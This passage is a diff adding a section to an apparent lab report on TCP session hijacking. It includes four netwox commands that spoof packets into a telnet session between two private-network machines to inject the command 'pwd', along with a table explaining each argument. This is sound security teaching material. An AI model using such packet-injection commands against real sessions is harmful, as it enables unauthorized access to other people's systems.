@@ -102,4 +102,56 @@ The video starts to play on the virtual machine with the IP Address \emph{192.16
 
 \section{Task 4}
 \subsection{TCP Session Hijacking}
+TCP Session Hijacking is an attack that involves intercepting a TCP session between 2 machines in order to hjiack it. Since in most TCP Sessions, the authentication is done only in the beginning, when a TCP Session is hijacked, the attacker will be able to gain the same access as the original user who logged in.
+
+\subsection{Injecting pwd command using netwox tool}
+The following commands were used to hijack the session and send the pwd command over. \\
+
+\begin{lstlisting}
+netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.121.129 --ip4-dst 192.168.121.130 --tcp-src 53022 --tcp-dst 23 --tcp-seqnum 1737301455 --tcp-window 6912 --tcp-data "70"
+netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.121.129 --ip4-dst 192.168.121.130 --tcp-src 53022 --tcp-dst 23 --tcp-seqnum 1737301456 --tcp-acknum 4197381889 --tcp-ack --tcp-window 6912 --tcp-data "77"
+netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.121.129 --ip4-dst 192.168.121.130 --tcp-src 53022 --tcp-dst 23 --tcp-seqnum 1737301457 --tcp-acknum 4197381890 --tcp-ack --tcp-window 6912 --tcp-data "64"
+netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.121.129 --ip4-dst 192.168.121.130 --tcp-src 53022 --tcp-dst 23 --tcp-seqnum 1737301458 --tcp-acknum 4197381891 --tcp-ack --tcp-window 6912 --tcp-data "0d00"
+\end{lstlisting}
+\pagebreak
+\subsubsection{Meaning of command line arguments}
+\begin{table}[here]
+\centering
+\begin{tabularx}{0.7\textwidth}{ | l | X | }
+\hline
+Argument			&	Meaning \\
+\hline
+--ip4-offsetfrag	& 	This represents the offset value of the current fragment in the IP packet. \\
+\hline
+--ip4-ttl			&	This represents the time to live of the current packet in seconds, with time intervals rounded up, to prevent the packet from persisting on the internet. In practice, this is essentially the number of hops the packet can take before being discarded. \\
+\hline
+--ip4-protocol		&	This represents the protocol that is carried by the IP packet, which most usually is either TCP or UDP. \\
+\hline
+--ip4-src			& 	This represents the IP address of the source of this packet. \\
+\hline
+--ip4-dst			& 	This represents the IP address of the destination of this packet. \\
+\hline
+--tcp-src			&	This represents the port of the source of this packet. \\
+\hline
+--tcp-dst			& 	This represents the port of the destination of this packet. \\
+\hline
+--tcp-seqnum		&	This represents the sequence number of the current TCP packet. \\
+\hline
+-tcp-acknum			& 	This represents the acknowledgement number of the current TCP packet, which is sent if there was a prior packet that it did not acknowledge. \\
+\hline
+--tcp-ack 			& 	This is a flag to inform netwox to set the TCP ACK bit to 1. \\
+\hline
+--tcp-window		& 	This represents the value of the size of the TCP window. \\
+\hline
+--tcp-data			& 	This represents the data that is sent over the network, and is encoded in \emph{Hex}. \\
+\hline
+\end{tabularx}
+\end{table}
+
+\subsection{Screenshots of results in Wireshark}
+\includegraphics[width=160mm]{task41.png}
+\includegraphics[width=160mm]{task42.png}
+\includegraphics[width=160mm]{task43.png}
+\includegraphics[width=160mm]{task44.png}
+\includegraphics[width=160mm]{task45.png}
 \enddocument
